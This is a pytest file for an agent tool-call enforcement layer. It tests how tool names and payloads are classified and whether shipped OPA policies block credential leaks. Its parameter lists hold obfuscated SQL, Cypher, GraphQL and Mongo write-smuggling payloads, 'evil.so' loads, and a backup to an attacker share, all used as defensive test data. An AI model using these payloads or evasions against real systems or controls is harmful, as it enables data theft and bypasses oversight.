# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Norviq Contributors

"""`classify_tool` publishes ONE verb, and both baseline policies key egress on it.

`input.derived.verb` is the only handle a policy has on the capability classifier, so a verb the
classifier decides not to report is not merely under-displayed — it is unsayable. Two ways that
silence was reachable, both measured through real `opa` against the two shipped baselines:

* A more-destructive token elsewhere in the name outranked the egress token. Every exec/destroy token
  is CRITICAL and every egress token is HIGH, so `invoke_send_pipeline`, `run_export`, `exec_upload`,
  `run_publish`, `restart_sync` and `eval_dispatch` all reported `delete` and the credential left.
* Ordinary egress verbs were simply absent from the lexicon, so `deliver_report`, `transmit_payload`,
  `broadcast_alert` and friends reported `unknown` — which neither the fourteen name prefixes nor the
  webhook/exfil substrings rescue.

The cost side is tested here too. Widening what counts as a sink must not turn reads into refusals,
and the control-plane actuation grade must survive the re-ranking.

The same unsayability cut the other way for reads (BACKLOG 7.10): `run` outranked the read it
governs, so `run_query` published `delete`, a `verb == "delete"` rule refused the one query tool a
support class was meant to use, and no admin promotion could reach a name the classifier resolves.
"""

from __future__ import annotations

import json
import shutil
import subprocess
import tempfile
from pathlib import Path
from types import SimpleNamespace

import pytest

from norviq.engine.capability.source_registry import Verb, classify_tool
from norviq.engine.evaluator import OPAEvaluator
from norviq.engine.graph.models import RiskLevel
from norviq.mcp.adversarial.chatbot_policies import SUPPORT_AGENT
from norviq.sdk.core.events import AgentIdentity, ToolCallEvent

REPO_ROOT = Path(__file__).resolve().parents[2]
_OPA = shutil.which("opa")

# BOTH copies: this OPA cannot import across packages, so the horizontal policy ships as two guarded
# copies and `webhook/presets/strict.rego` is the one the bootstrap pushes as the cluster baseline.
POLICIES = {
    "comprehensive": REPO_ROOT / "comprehensive.rego",
    "strict (SHIPPED as the cluster baseline)": REPO_ROOT / "webhook" / "presets" / "strict.rego",
}

# The canonical AWS key pair the policy's own detectors match perfectly. Only the SINK NAME differs
# between cases — never the payload — so any difference in verdict is a difference in what the policy
# considers a sink.
CREDENTIAL_PAYLOAD = {
    "channel": "C0ATTACKER",
    "text": "deploy notes: AKIAIOSFODNN7EXAMPLE wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
}

# An exec/destructive token sharing the name with an egress token. Each of these leaked.
EXEC_SHADOWED_SINKS = [
    "invoke_send_pipeline", "run_export", "execute_export", "exec_upload",
    "run_publish", "restart_sync", "eval_dispatch",
]

# Ordinary vendor egress verbs that were missing from the SEND lexicon entirely.
UNLEXICONED_SINKS = [
    "deliver_report", "transmit_payload", "submit_form", "broadcast_alert",
    "escalate_case", "ship_logs", "outbound_message", "cc_manager", "bcc_audit", "egress_blob",
]


def _package(policy: Path) -> str:
    for line in policy.read_text(encoding="utf-8").splitlines():
        if line.startswith("package "):
            return line.split(None, 1)[1].strip()
    raise AssertionError(f"no package declaration in {policy}")


def _derived(tool_name: str, params: object) -> dict:
    class _Event:
        pass

    event = _Event()
    event.tool_name = tool_name
    event.tool_params = params
    event.agent_identity = None
    return OPAEvaluator.__new__(OPAEvaluator)._derived_input(event)


def _decide(policy: Path, tool_name: str, params: dict) -> tuple[str, str]:
    doc = {
        "tool_name": tool_name,
        "tool_params": params,
        "agent": {"namespace": "analytics", "agent_class": "support-agent"},
        "agent_identity": {"namespace": "analytics", "agent_class": "support-agent"},
        "derived": _derived(tool_name, params),
        "trust_category": "high",
    }
    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / "input.json"
        path.write_text(json.dumps(doc), encoding="utf-8")
        out = subprocess.run(
            ["opa", "eval", "-f", "raw", "--v0-compatible", "-d", str(policy), "-i", str(path),
             f"[data.{_package(policy)}.decision, data.{_package(policy)}.rule_id]"],
            capture_output=True, text=True, check=True,
        )
    decision, rule_id = json.loads(out.stdout.strip())
    return decision, rule_id


# ── the verb the classifier reports ───────────────────────────────────────────────────────────────

@pytest.mark.parametrize("tool_name", EXEC_SHADOWED_SINKS)
def test_an_exec_token_does_not_erase_the_send_evidence(tool_name: str) -> None:
    """The name literally contains `send`/`upload`/`publish`/`export`/`sync`/`dispatch`."""
    verb, _risk = classify_tool(tool_name)
    assert verb is Verb.SEND, f"{tool_name} reported {verb.value} — the egress evidence was discarded"


@pytest.mark.parametrize("tool_name", EXEC_SHADOWED_SINKS)
def test_the_critical_grade_the_exec_token_earned_is_kept(tool_name: str) -> None:
    """Reporting the egress verb must not downgrade the risk — the console still shows CRITICAL.

    Verb and risk are ranked separately for exactly this reason: the verb is what policy can act on,
    the risk is what the operator is shown.
    """
    _verb, risk = classify_tool(tool_name)
    assert risk is RiskLevel.CRITICAL


@pytest.mark.parametrize("tool_name", UNLEXICONED_SINKS)
def test_ordinary_egress_verbs_are_in_the_lexicon(tool_name: str) -> None:
    """`unknown` is a universal bypass for anything named unrecognisably — the evaluator says so."""
    verb, risk = classify_tool(tool_name)
    assert (verb, risk) == (Verb.SEND, RiskLevel.HIGH)


@pytest.mark.parametrize("tool_name", ["open_relay", "close_relay", "open_breaker", "set_valve"])
def test_control_plane_actuation_keeps_its_destructive_grade(tool_name: str) -> None:
    """An actuation noun under a control verb is a whole-NAME determination, not one token among many.

    `open_relay` is an electrical relay being thrown. `relay` is also an egress token, so ranking it
    as one more candidate would report an ICS command as `send` — losing the control-plane grade and
    feeding a physical actuation to the egress detectors.
    """
    assert classify_tool(tool_name) == (Verb.DELETE, RiskLevel.CRITICAL)


# A destruction verb standing next to an EGRESS NOUN. These are ordinary vendor tools — `delete_email`
# is Gmail's, `remove_webhook` is GitHub's and Slack's — and every one of them is a delete.
DESTRUCTION_BESIDE_AN_EGRESS_NOUN = [
    "delete_email", "delete_mail", "remove_email", "remove_webhook", "revoke_share", "expire_share",
    "purge_mail_queue", "invalidate_push_token", "delete_upload", "erase_post", "destroy_share",
    "truncate_export", "terminate_transfer", "drop_publish", "delete_export_job",
]


@pytest.mark.parametrize("tool_name", DESTRUCTION_BESIDE_AN_EGRESS_NOUN)
def test_an_egress_noun_does_not_erase_the_destruction_evidence(tool_name: str) -> None:
    """The mirror image of `test_an_exec_token_does_not_erase_the_send_evidence`, and the reason the
    fix is "demote the exec QUALIFIERS" rather than "SEND outranks DELETE".

    Ranking SEND above DELETE outright also fixes the seven exec-shadowed sinks — and takes every one
    of these with it. `verb` is unsayable in whichever direction it loses: reported as "send",
    `delete_email` tells the asset graph's per-verb inventory that an agent holding a mailbox-delete
    grant cannot delete, silences `tool-allowlist-perimeter.rego`'s "unlisted tool attempted a delete"
    reason, and gets refused under an egress refinement it has nothing to do with.
    """
    verb, risk = classify_tool(tool_name)
    assert verb is Verb.DELETE, f"{tool_name} reported {verb.value} — the destruction evidence was discarded"
    assert risk is RiskLevel.CRITICAL


@pytest.mark.parametrize("tool_name", ["exec_search", "shell_get_env", "bash_read_file", "eval_query"])
def test_an_exec_token_still_outranks_the_read_it_governs(tool_name: str) -> None:
    """An exec token is demoted below SEND, NOT below everything.

    `shell`/`bash`/`eval`/`exec` name an interpreter the call hands a string to, and that is the
    operation whatever the string is for. This test used to carry `run_query` too, asserting that
    `run` outranked the read it governs because "`run_query` executes arbitrary SQL" — true, and
    equally true of `query`/`sql_query`/`read_query`, which have always classified `read`. It pinned
    BACKLOG 7.10 (a `run_<read>` tool refused by a `verb == "delete"` rule, with no promotion able to
    reach it) as intended behaviour; `run` now has its own tests below.
    """
    verb, risk = classify_tool(tool_name)
    assert (verb, risk) == (Verb.DELETE, RiskLevel.CRITICAL)


# BACKLOG 7.10. Every one of these reported `delete` before the run qualifiers were split out.
RUN_QUALIFIED_OPERATIONS = [
    ("run_query", Verb.READ),
    ("run_search", Verb.READ),
    ("run_sql_query", Verb.READ),
    ("run_lookup", Verb.READ),
    ("runSearch", Verb.READ),
    ("payments_run_query", Verb.READ),
    ("execute_query", Verb.READ),
    ("invoke_search", Verb.READ),
    # `run` as a NOUN — a CI run — is the same token and was the same false `delete`.
    ("get_run_status", Verb.READ),
    ("list_run_logs", Verb.READ),
    ("run_update", Verb.WRITE),
]


@pytest.mark.parametrize("tool_name,expected", RUN_QUALIFIED_OPERATIONS)
def test_a_run_qualifier_yields_to_the_operation_it_governs(tool_name: str, expected: Verb) -> None:
    """`run`/`execute`/`invoke` say "carry out X" and nothing about X — the governed token is the verb.

    `derived.verb` is the only handle a policy has on the classification, and a `delete` here was
    not a conservative over-statement: the chatbot scenario's `support_no_destructive_verb` refused
    the support agent's one sanctioned query tool on every call, and the promotion an admin would
    reach for is ignored by design for a name the classifier resolves.
    """
    assert classify_tool(tool_name)[0] is expected, tool_name


@pytest.mark.parametrize("tool_name", [name for name, _ in RUN_QUALIFIED_OPERATIONS])
def test_a_run_qualified_operation_keeps_the_critical_grade(tool_name: str) -> None:
    """Only the VERB moved. The console still shows these critical — the same split `run_export`
    (send, critical) already makes, for the same reason: verb is what policy acts on, risk is what
    the operator is shown, and something that runs what it is given earns the grade."""
    assert classify_tool(tool_name)[1] is RiskLevel.CRITICAL


@pytest.mark.parametrize("tool_name", [
    "run", "run_report", "run_analysis", "run_job", "run_shell", "run_bash", "run_command",
    "run_script", "run_code", "execute_sql", "execute_command", "invoke_lambda", "invoke_model",
])
def test_a_run_qualifier_with_nothing_to_govern_keeps_the_exec_reading(tool_name: str) -> None:
    """A name that says something is executed and nothing about WHAT must not read as harmless.

    `run_report` is likely a read; `run_job`, `run_playbook` and `run_migration` are not, and a noun
    the lexicon does not know cannot tell them apart. So the qualifier stays the verb here, and the
    exec reading — `delete`/critical, the codebase's verb for execution — is kept. A bare `run` is the
    generic executor and is the clearest case of the lot.
    """
    assert classify_tool(tool_name) == (Verb.DELETE, RiskLevel.CRITICAL)


@pytest.mark.parametrize("params", [{"query": "select 1"}, {"q": "select * from orders"}])
def test_a_payload_cannot_talk_a_bare_run_down_to_a_read(params: dict) -> None:
    """The payload fills in a name that says NOTHING; `run` says "executes", so it is not consulted.

    tool_params is agent-supplied and chosen even more freely than the name. Were a select statement
    allowed to reclassify `run`, any executor could be made to read as a read by its arguments.
    """
    assert classify_tool("run", params) == (Verb.DELETE, RiskLevel.CRITICAL)


@pytest.mark.parametrize("tool_name", [
    "run_command_get_output", "execute_script_read_result", "run_code_list_files",
    "invoke_program_fetch", "run_subprocess_get_status",
])
def test_a_run_qualifier_governing_code_is_still_an_execution(tool_name: str) -> None:
    """`run_command_get_output` RUNS A COMMAND; its trailing `get` is about what comes back.

    Without the execution-object check every one of these would report `read` — the trailing read
    token winning over a qualifier that ranks beneath READ — and an executing tool would pick up the
    read-only allowances. The objects only count beside a qualifier, so `get_script` and
    `get_command_invocation` (reads of a definition) are pinned unchanged below.
    """
    assert classify_tool(tool_name) == (Verb.DELETE, RiskLevel.CRITICAL)


@pytest.mark.parametrize("tool_name", [
    "run_python_get_output", "execute_python_read_result", "run_javascript_get_result",
    "run_powershell_get", "run_node_list", "run_sandbox_get_output", "run_repl_read",
    "run_cell_get_output", "run_notebook_get_output", "execute_process_read_output",
    "execute_snippet_view", "invoke_lambda_get_result", "invoke_function_list", "run_load_test",
])
def test_a_run_qualifier_governing_a_runtime_is_still_an_execution(tool_name: str) -> None:
    """The runtimes and units of code a run qualifier is told to run (`_EXECUTION_OBJECTS`, 2nd/3rd
    lines). Every one of these reported `read` with only `command`/`script`/`code` in the set: each
    runs code and hands back what it printed, and the trailing read token disguised that. `run_load_test`
    is the same shape through the lexicon's `load` (a read token): it runs a test suite."""
    assert classify_tool(tool_name) == (Verb.DELETE, RiskLevel.CRITICAL)


@pytest.mark.parametrize("tool_name", [
    "get_script", "get_command_invocation", "list_console_sessions",
    "get_python_version", "list_functions", "get_notebook", "list_lambda_aliases", "get_test_results",
])
def test_execution_objects_mean_nothing_without_a_run_qualifier(tool_name: str) -> None:
    assert classify_tool(tool_name)[0] is Verb.READ


@pytest.mark.parametrize("tool_name,expected", [
    # Pinned so the re-ranking cannot quietly reclassify the single-verb names.
    ("aws_s3_delete", Verb.DELETE),
    ("execute_sql", Verb.DELETE),
    ("invoke_lambda", Verb.DELETE),
    ("terminate_pod", Verb.DELETE),
    ("delete_after_read", Verb.DELETE),
    ("s3_put_object", Verb.WRITE),
    ("rotate_key", Verb.WRITE),
    ("describe_instances", Verb.READ),
    ("gcs_bucket_list", Verb.READ),
    ("read_meter", Verb.READ),
    ("send_email", Verb.SEND),
    ("transfer_funds", Verb.SEND),
])
def test_single_verb_names_are_unchanged(tool_name: str, expected: Verb) -> None:
    assert classify_tool(tool_name)[0] is expected


def test_ambiguous_nouns_are_deliberately_absent_from_the_send_lexicon() -> None:
    """`route`/`stream`/`copy` are at least as often reads or intra-boundary writes.

    A SEND token beats a READ token, so registering them would reclassify `get_route`/`read_stream` as
    egress sinks and refuse them. The residual is real and deliberate; this pins the decision so it is
    revisited rather than drifted into.
    """
    for read_name in ("get_route", "list_route", "read_stream", "get_stream"):
        assert classify_tool(read_name)[0] is Verb.READ, read_name


# ── what the shipped policies actually decide ─────────────────────────────────────────────────────

pytestmark_opa = pytest.mark.skipif(
    _OPA is None,
    reason="needs the opa binary — a skipped rego test proves nothing and must not read as green",
)


@pytestmark_opa
@pytest.mark.parametrize("policy_name,policy", POLICIES.items(), ids=list(POLICIES))
@pytest.mark.parametrize("tool_name", EXEC_SHADOWED_SINKS + UNLEXICONED_SINKS)
def test_a_credential_is_refused_through_every_newly_classified_sink(
    tool_name: str, policy_name: str, policy: Path
) -> None:
    decision, rule_id = _decide(policy, tool_name, CREDENTIAL_PAYLOAD)
    assert (decision, rule_id) == ("block", "llm02_data_leakage"), (
        f"{tool_name} exfiltrated a credential through {policy_name}"
    )


@pytestmark_opa
@pytest.mark.parametrize("policy_name,policy", POLICIES.items(), ids=list(POLICIES))
@pytest.mark.parametrize("tool_name,params", [
    ("run_query", {"query": "select 1"}),
    # `run_query` was the row that caught a `verb == "delete"` BLOCK arm when one was tried (see the
    # comment on strict.rego's token arm). Since BACKLOG 7.10 it classifies `read`, so it can no longer
    # catch that; `run_report` still classifies `delete` and keeps the guard alive.
    ("run_report", {"name": "monthly revenue summary"}),
    ("search_kb", {"q": "how do I reset a password"}),
    ("read_thread", {"channel": "C123"}),
    ("get_order", {"order_id": "1"}),
    ("list_tickets", {"status": "open"}),
    ("describe_instances", {"region": "eu-west-1"}),
    ("get_route", {"route_id": "r1"}),
])
def test_reads_are_not_swept_up_by_the_wider_lexicon(
    tool_name: str, params: dict, policy_name: str, policy: Path
) -> None:
    """The cost side. Widening what counts as a sink must not turn a read into a refusal."""
    decision, _rule = _decide(policy, tool_name, params)
    assert decision == "allow", f"{tool_name} was newly refused by {policy_name}"


# ── BACKLOG 7.10 through a real verb-gated policy ─────────────────────────────────────────────────

def _scenario_decide(policy_text: str, package: str, tool_name: str, params: dict) -> tuple[str, str]:
    """Decide through the evaluator's OWN input builder, so `derived.verb` and the normalized params
    are exactly what a live call would carry rather than a hand-built approximation of them."""
    event = ToolCallEvent(
        tool_name=tool_name, tool_params=params,
        agent_identity=AgentIdentity(spiffe_id="spiffe://cluster.local/ns/agents/sa/support",
                                     namespace="agents", agent_class="support-agent"),
    )
    doc = OPAEvaluator.__new__(OPAEvaluator)._build_input(event, SimpleNamespace(score=0.8, category="high"))
    with tempfile.TemporaryDirectory() as tmp:
        policy = Path(tmp) / "policy.rego"
        policy.write_text(policy_text, encoding="utf-8")
        path = Path(tmp) / "input.json"
        path.write_text(json.dumps(doc), encoding="utf-8")
        out = subprocess.run(
            ["opa", "eval", "-f", "raw", "--v0-compatible", "-d", str(policy), "-i", str(path),
             f"[data.{package}.decision, data.{package}.rule_id]"],
            capture_output=True, text=True, check=True,
        )
    decision, rule_id = json.loads(out.stdout.strip())
    return decision, rule_id


@pytestmark_opa
@pytest.mark.parametrize("params", [
    {"sql": "select * from customers where id = 8812"},
    {"sql": "select count(*) from tickets"},
])
def test_the_scenario_support_agent_can_use_its_one_query_tool(params: dict) -> None:
    """The defect as it was found on kind (BACKLOG 7.10): `support_no_destructive_verb` is
    `input.derived.verb == "delete"`, and `run_query` — the class's sanctioned read path, per the
    policy's own comment — carried that verb, so every call was refused under it, the scenario
    retried, and trust fell to the floor. The admin promotion it then tried could not reach a name
    the classifier resolves."""
    assert _scenario_decide(SUPPORT_AGENT, "norviq.mcp.chatbot.support", "run_query", params) == (
        "allow", "support_default_allow",
    )


@pytestmark_opa
@pytest.mark.parametrize("sql,rule", [
    # The scenario's own smuggled write (chatbot_scenario.py), named by the rule that reads the SQL.
    ("update accounts set balance = 0", "support_no_write_sql"),
    # GRANT is in no keyword list: refused by the policy's verb arm, on the verb the statement raised.
    ("GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO support", "support_no_write_sql"),
    # A destructive statement is named as destructive, because now it is the call and not the name
    # that carries the verb. `support_no_destructive_verb` sorts first and is the accurate rule.
    ("DELETE FROM customers WHERE 1=1", "support_no_destructive_verb"),
])
def test_the_scenario_refuses_a_write_smuggled_through_the_query_tool_under_the_rule_that_fits(
    sql: str, rule: str
) -> None:
    """Which rule the audit row names is the point of this test, so each statement pins one.

    Before BACKLOG 7.10 every one of these was attributed to `support_no_destructive_verb`, because the
    verb rule fired on the NAME for every call. After the first cut of the fix the DELETE moved to
    `support_no_write_sql` and the GRANT was allowed outright: the name said `read` and nothing read the
    statement. Now the statement sets the verb, so the destructive rule names the destructive call and
    nothing else, and a write the keyword list does not spell is still refused.
    """
    assert _scenario_decide(SUPPORT_AGENT, "norviq.mcp.chatbot.support", "run_query", {"sql": sql}) == (
        "block", rule,
    )


# ── the payload a run qualifier carries (BACKLOG 7.10, fail-closed) ───────────────────────────────
#
# A run qualifier that yields to a READ keeps `read` ONLY when the payload is positively a read; a
# WRITE-named run qualifier (run_update) is only ever raised. The first cut of this fix enumerated the
# write SHAPES it recognised and fell to `read` on anything else — an independent review proved on a
# real PostgreSQL 16 and three MCP dialects that the writes it had not enumerated (comment/literal
# obfuscation, DO blocks, CTEs, T-SQL `DELETE customers`, MySQL `INSERT … SET`, LOAD/REASSIGN/SHUTDOWN/
# BULK/RESTORE, Cypher, GraphQL, Mongo, ES) all EXECUTED and all classified `read`, then passed the
# three `verb == "read"` controls. The test is now inverted: prove read, deny everything else.

# (name, payload, expected verb). Every row carries a statement/mutation keyword, so none may be read.
RUN_QUALIFIED_WRITES = [
    # the four writes the first review measured getting past three shipped controls
    ("run_query", {"sql": "UPDATE users SET role = 'admin' WHERE id = 7"}, Verb.WRITE),
    ("run_query", {"sql": "INSERT INTO grants(user_id, role) VALUES (7, 'admin')"}, Verb.WRITE),
    ("execute_query", {"sql": "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO attacker"}, Verb.WRITE),
    ("execute_query", {"sql": "ALTER TABLE audit_log DISABLE TRIGGER ALL"}, Verb.WRITE),
    ("run_query", {"sql": "DELETE FROM customers WHERE 1=1"}, Verb.DELETE),
    ("execute_query", {"sql": "DROP TABLE users"}, Verb.DELETE),
    ("run_query", {"sql": "TRUNCATE audit_log"}, Verb.DELETE),
    ("run_query", {"sql": "REVOKE SELECT ON users FROM analyst"}, Verb.DELETE),
    # second-review evasions, each EXECUTED on PostgreSQL 16 (scratchpad rev710-2/pgproof_out.txt)
    ("run_query", {"sql": "SELECT '--'; /* x */UPDATE/**/users/**/SET/**/role='admin' WHERE id=7"}, Verb.WRITE),
    ("run_query", {"sql": "SELECT '#'; /* x */UPDATE/**/users/**/SET role='admin' WHERE id=7"}, Verb.WRITE),
    ("run_query", {"sql": "SELECT 1 # 2; /* x */UPDATE/**/users/**/SET role='admin'"}, Verb.WRITE),
    ("run_query", {"sql": "SELECT * FROM posts WHERE tag = '#promo'; /* b */UPDATE/**/users/**/SET x=1"}, Verb.WRITE),
    ("run_query", {"sql": "SELECT $$--$$; /* x */UPDATE/**/users/**/SET role='admin'"}, Verb.WRITE),
    ("run_query", {"sql": "SELECT '--'; /* x */DROP/**/TABLE/**/users"}, Verb.DELETE),
    ("run_query", {"sql": "SELECT '--'; /* x */DELETE/**/FROM/**/customers"}, Verb.DELETE),
    ("run_query", {"sql": "DO E'BEGIN UPDATE users SET role=''admin''; END'"}, Verb.DELETE),  # do -> delete
    ("run_query", {"sql": "DO E'BEGIN EXECUTE ''DR''||''OP TABLE users''; END'"}, Verb.DELETE),
    ("run_query", {"sql": 'WITH x AS (UPDATE users AS "a b c" SET role=\'admin\' RETURNING 1) SELECT 1'}, Verb.WRITE),
    ("run_query", {"sql": "WITH y AS (SELECT '--'), x AS (DELETE/**/FROM customers RETURNING 1) SELECT 1"}, Verb.DELETE),
    ("run_query", {"sql": "SELECT 1 AS a INTO TEMP newt"}, Verb.WRITE),
    ("run_query", {"sql": 'CALL "pg_temp".do_writes()'}, Verb.DELETE),  # call -> delete
    ("run_query", {"sql": "COPY users FROM $$/nonexistent/evil.csv$$"}, Verb.WRITE),
    ("run_query", {"sql": "DELETE customers"}, Verb.DELETE),            # T-SQL, no FROM
    ("run_query", {"sql": "INSERT users SET role='admin', name='x'"}, Verb.WRITE),  # MySQL
    ("run_query", {"sql": "LOAD '/tmp/evil.so'"}, Verb.WRITE),
    ("run_query", {"sql": "REASSIGN OWNED BY app TO attacker"}, Verb.DELETE),
    ("run_query", {"sql": "IMPORT FOREIGN SCHEMA public FROM SERVER s INTO local"}, Verb.WRITE),
    ("run_query", {"sql": "SHUTDOWN WITH NOWAIT"}, Verb.DELETE),
    ("run_query", {"sql": "KILL 52"}, Verb.DELETE),
    ("run_query", {"sql": "BULK INSERT users FROM 'c:/x.csv'"}, Verb.WRITE),
    ("run_query", {"sql": "RESTORE DATABASE prod FROM DISK='x.bak'"}, Verb.DELETE),
    ("run_query", {"sql": "BACKUP DATABASE prod TO DISK='\\\\attacker\\share\\x.bak'"}, Verb.DELETE),
    ("run_query", {"sql": "INSTALL PLUGIN x SONAME 'evil.so'"}, Verb.WRITE),
    ("run_query", {"sql": "RESET MASTER"}, Verb.DELETE),
    ("run_query", {"sql": "PURGE BINARY LOGS BEFORE NOW()"}, Verb.DELETE),
    # non-SQL dialects — the payload is a `query`/`operation`/`script`, at a nested key
    ("run_query", {"query": "MATCH (n) DETACH DELETE n"}, Verb.DELETE),
    ("run_cypher_query", {"query": "MATCH (u:User {id:7}) SET u.role='admin'"}, Verb.WRITE),
    ("run_query", {"query": "MERGE (u:User {id:7}) SET u.role='admin'"}, Verb.WRITE),
    ("run_graphql_query", {"query": "mutation { deleteUser(id: 7) { id } }"}, Verb.DELETE),
    ("execute_graphql_query", {"query": "mutation { updateUser(id: 7) { id } }"}, Verb.WRITE),
    ("run_query", {"collection": "users", "operation": "deleteMany", "filter": {}}, Verb.DELETE),
    ("run_search", {"index": "logs", "query": {"match_all": {}}, "script": {"source": "ctx._source.r='a'"}}, Verb.WRITE),
    ("run_query", {"collection": "users", "operation": "findOneAndUpdate", "update": {}}, Verb.WRITE),
    # the write is a JSON-in-a-string, or buried in a list/nested dict — walked at any depth
    ("run_query", {"q": '{"op": "UPDATE users SET a=1"}'}, Verb.WRITE),
    ("run_query", {"batch": ["select 1", "UPDATE users SET a=1"]}, Verb.WRITE),
    ("run_query", {"args": {"inner": {"sql": "DROP TABLE users"}}}, Verb.DELETE),
    # a write keyword in a KEY, value otherwise clean (the ES `script` shape)
    ("run_query", {"update": {"id": 7}}, Verb.WRITE),
    # run_update is write-named: a destructive payload raises it, a plain one stays write
    ("run_update", {"sql": "DROP TABLE users"}, Verb.DELETE),
    ("run_update", {"id": 1}, Verb.WRITE),
    ("run_update", {"sql": "select 1"}, Verb.WRITE),   # never lowered to read
]


@pytest.mark.parametrize("tool_name,params,expected", RUN_QUALIFIED_WRITES)
def test_a_run_qualifier_with_a_non_read_payload_never_reads(
    tool_name: str, params: dict, expected: Verb
) -> None:
    """Fail closed. A statement/mutation keyword anywhere in the payload — in a comment, a literal, a
    `$$…$$` body, a nested key or a list — means the call is not provably a read, so the name does not
    get to report `read`. Every row here EXECUTES a write; none may be read. The verb is the pre-7.10
    reading: a destructive keyword -> delete, any other mutation keyword -> write."""
    assert classify_tool(tool_name, params) == (expected, RiskLevel.CRITICAL), params


@pytest.mark.parametrize("tool_name,params", [
    # the review's keep-as-read columns, each on a real SELECT — none is a bare keyword token because
    # underscore is not a split boundary, so `update_count` / `drop_off` / `result_set` stay read
    ("run_query", {"sql": "SELECT id, created_at, updated_at, deleted FROM jobs"}),
    ("run_query", {"sql": "SELECT settings, description, update_count, drop_off, result_set FROM jobs"}),
    ("run_query", {"sql": "SELECT created_by, last_login, insert_ts, delete_flag FROM audit"}),
    # ordinary benign SELECTs (the benign corpus's run_query rows and more)
    ("run_query", {"sql": "select * from customers where id = 8812"}),
    ("run_query", {"sql": "SELECT id, total FROM orders WHERE status = 'open';"}),
    ("run_query", {"sql": "-- weekly report\nSELECT count(*) FROM orders"}),
    ("run_query", {"sql": "SELECT name FROM customers WHERE name = 'O''Brien'"}),
    ("run_query", {"sql": "WITH recent AS (SELECT * FROM orders) SELECT count(*) FROM recent"}),
    ("run_query", {"sql": "EXPLAIN SELECT * FROM orders"}),
    ("execute_query", {"sql": "select count(*) from tickets", "timeout": 30}),
    # a read with no SQL-shaped string at all
    ("run_query", {"limit": 10, "offset": 0}),
    ("run_lookup", {"email": "customer@acme.example"}),
    ("run_search", {"to": "2026-03-31", "from": "2026-01-01"}),
    # non-SQL reads
    ("run_query", {"query": "MATCH (n:User {id: 7}) RETURN n.name"}),
    ("run_graphql_query", {"query": "query { user(id: 7) { name } }"}),
    ("run_query", {"collection": "users", "operation": "find", "filter": {"id": 7}}),
])
def test_a_run_qualifier_with_a_positively_read_payload_stays_read(tool_name: str, params: dict) -> None:
    """The precision side, and the explicit keep-list from the review. A payload with no statement/
    mutation keyword in any string (keys or values) is positively a read, so 7.10 stays fixed: the
    SUPPORT-style `verb == "delete"` rule and the read-only allow arms stop refusing these."""
    assert classify_tool(tool_name, params) == (Verb.READ, RiskLevel.CRITICAL), params


@pytest.mark.parametrize("tool_name,sql", [
    # accepted trade-offs: a standalone keyword WORD in a SELECT literal, and SELECT ... FOR UPDATE,
    # classify non-read. Neither is a regression against 90b9f49 (which classified every run_* delete);
    # it is the precision the first, failed cut bought by failing open, given back for fail-closed.
    ("run_query", "SELECT id FROM tickets WHERE subject = 'login; password reset'"),  # 'reset' -> delete
    ("run_query", "SELECT * FROM orders FOR UPDATE SKIP LOCKED"),                     # 'update' -> write
])
def test_accepted_trade_off_a_keyword_word_in_a_select_is_not_read(tool_name: str, sql: str) -> None:
    """Documented cost of the keyword deny-list. `reset` (RESET MASTER) and `update` (UPDATE) are
    kept in the set because they name real writes; a SELECT whose literal or lock clause carries the
    bare word is refused as a result. 90b9f49 refused these too (all run_* were delete)."""
    assert classify_tool(tool_name, {"sql": sql})[0] is not Verb.READ


@pytest.mark.parametrize("tool_name", ["run", "run_shell", "run_command", "run_code", "execute_sql",
                                       "invoke_lambda", "exec_query"])
@pytest.mark.parametrize("params", [{"sql": "select 1"}, {"sql": "UPDATE users SET a=1"}, None])
def test_a_genuine_executor_keeps_the_exec_reading_whatever_it_is_handed(tool_name: str, params) -> None:
    """A qualifier that governs nothing the lexicon knows, or governs code, resolved to delete by NAME
    and is never in the (read, write) gate, so no payload moves it."""
    assert classify_tool(tool_name, params) == (Verb.DELETE, RiskLevel.CRITICAL)


@pytest.mark.parametrize("tool_name", ["run_export", "run_publish"])
def test_a_send_named_run_qualifier_is_untouched_by_the_payload(tool_name: str) -> None:
    """The gate is (read, write) only; a send name keeps its send, so the egress detectors that key on
    `verb == "send"` keep seeing it whatever the payload says."""
    assert classify_tool(tool_name, {"sql": "DROP TABLE users"})[0] is Verb.SEND


@pytest.mark.parametrize("tool_name,params", [
    ("search_tickets", {"query": "please delete from my calendar"}),
    ("get_order", {"note": "DROP TABLE users"}),
    ("query", {"sql": "UPDATE users SET a=1"}),
])
def test_a_name_without_a_run_qualifier_does_not_consult_the_payload(tool_name: str, params: dict) -> None:
    """The payload is read only where the NAME carries a run qualifier. `query`/`sql_query` report
    `read` whatever they carry (the pre-existing limit of a name classifier, and why the SQL-allowlist
    template exists), and a DROP in a non-run tool's prose is the baselines' destructive-SQL detector's
    to catch, not this classifier's."""
    assert classify_tool(tool_name, params)[0] is Verb.READ


def test_a_name_only_run_qualifier_keeps_its_read() -> None:
    """With NO payload, the name's reading stands. Name-only callers — the console's capability surface,
    the rate limiter, the asset graph — ask `classify_tool(name)` and must get the 7.10 `read`; the
    enforcement path always passes tool_params, which is where a smuggled write would be."""
    assert classify_tool("run_query")[0] is Verb.READ
    assert classify_tool("run_query", None)[0] is Verb.READ
    assert classify_tool("get_run_status")[0] is Verb.READ


@pytest.mark.parametrize("value", [
    "/* " * 87_000,                       # every opener unterminated
    "update x set y;" * 17_000,
    "select " + "update " * 37_000,
    "*/" * 131_000,
])
def test_reading_the_payload_stays_linear_at_the_body_cap(value: str) -> None:
    """The token scan runs on the enforcement path over a value the agent writes, up to the 256 KiB
    body cap. It is linear in the payload; this asserts it stays well inside the fail-closed budget."""
    import time

    start = time.perf_counter()
    classify_tool("run_query", {"sql": value})
    assert time.perf_counter() - start < 1.0


def test_the_payload_walk_survives_depth_and_cycles() -> None:
    """A deeply nested body must not raise RecursionError on the enforcement path, and a self-
    referencing dict (an in-process caller can build one) must not spin the walk."""
    deep: object = "UPDATE users SET role = 'admin'"
    for _ in range(3_000):
        deep = [deep]
    assert classify_tool("run_query", {"p": deep})[0] is Verb.WRITE
    # No keyword anywhere, so the walk cannot short-circuit — it must traverse the whole structure and
    # would loop forever on the self-reference without the visited set. It terminates and stays read.
    cyclic: dict = {"note": "select a plan", "tag": "all good"}
    cyclic["again"] = cyclic
    cyclic["more"] = [cyclic, "nothing here"]
    assert classify_tool("run_query", cyclic)[0] is Verb.READ
